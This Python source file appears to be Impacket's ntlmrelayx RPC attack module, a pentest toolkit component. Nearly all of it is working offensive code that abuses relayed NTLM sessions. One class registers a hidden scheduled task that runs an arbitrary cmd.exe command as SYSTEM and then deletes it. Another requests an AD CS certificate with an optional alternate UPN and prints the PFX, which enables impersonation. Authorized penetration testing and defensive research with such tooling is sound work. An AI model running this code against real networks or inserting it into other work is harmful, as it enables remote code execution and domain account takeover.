# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Authors:
#   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
#   Sylvain Heiniger @(sploutchy) / Compass Security (https://www.compass-security.com)
#   Based on @agsolino and @_dirkjan code
#
import base64
import time
import string
import random

from OpenSSL import crypto

from impacket import LOG
from impacket.dcerpc.v5 import tsch, icpr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.icpr import DCERPCSessionError
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack

PROTOCOL_ATTACK_CLASS = "RPCAttack"

# cache already attacked clients
ELEVATED = []


class TSCHRPCAttack:
    def _xml_escape(self, data):
        replace_table = {
             "&": "&amp;",
             '"': "&quot;",
             "'": "&apos;",
             ">": "&gt;",
             "<": "&lt;",
             }
        return ''.join(replace_table.get(c, c) for c in data)

    def _run(self):
        # Here PUT YOUR CODE!
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])

        cmd = "cmd.exe"
        args = "/C %s" % self.config.command

        LOG.info('Executing command %s in no output mode via %s' % (self.config.command, self.stringbinding))

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % (self._xml_escape(cmd), self._xml_escape(args))

        LOG.info('Creating task \\%s' % tmpName)
        tsch.hSchRpcRegisterTask(self.dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)

        LOG.info('Running task \\%s' % tmpName)
        done = False

        tsch.hSchRpcRun(self.dce, '\\%s' % tmpName)

        while not done:
            LOG.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(self.dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        LOG.info('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(self.dce, '\\%s' % tmpName)
        LOG.info('Completed!')


class ICPRRPCAttack:
    def _run(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return

        current_template = self.config.template
        if current_template is None:
            current_template = "Machine" if self.username.endswith("$") else "User"

        LOG.debug("Generating a CSR for user %s and template %s" % (self.username, current_template))

        csr = ADCSAttack.generate_csr(key, self.username, self.config.altName, crypto.FILETYPE_ASN1)
        LOG.info("CSR generated!")

        attributes = ["CertificateTemplate:%s" % current_template]

        if self.config.altName is not None:
            attributes.append("SAN:upn=%s" % self.config.altName)

        LOG.info("Getting certificate...")
        try:
            certificate = icpr.hCertServerRequest(self.dce, csr, attributes, ca=self.config.icpr_ca_name)
        except DCERPCSessionError as e:
            if e.error_code == 0x80070057:
                LOG.error("Error occured while getting certificate: %s Check your CA name?" % e)
            elif e.error_code == 0x80070005:
                LOG.error("Error occured while getting certificate: %s Maybe encryption is enforced?" % e)
            else:
                LOG.error("Unknown error occured while getting certificate: %s" % e)
            return

        ELEVATED.append(self.username)

        certificate_store = ADCSAttack.generate_pfx(key, certificate, crypto.FILETYPE_ASN1)
        LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store)))


class RPCAttack(ProtocolAttack, TSCHRPCAttack):
    PLUGIN_NAMES = ["RPC"]

    def __init__(self, config, dce, username):
        ProtocolAttack.__init__(self, config, dce, username)
        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()
        self.endpoint = config.rpc_mode

    def run(self):
        if self.endpoint == "TSCH":
            # TODO: support for providing a shell
            # TODO: support for getting an output
            if self.config.command is not None:
                TSCHRPCAttack._run(self)
            else:
                LOG.error("No command provided to attack")
        elif self.endpoint == "ICPR":
            ICPRRPCAttack._run(self)
        else:
            raise NotImplementedError("Not implemented!")
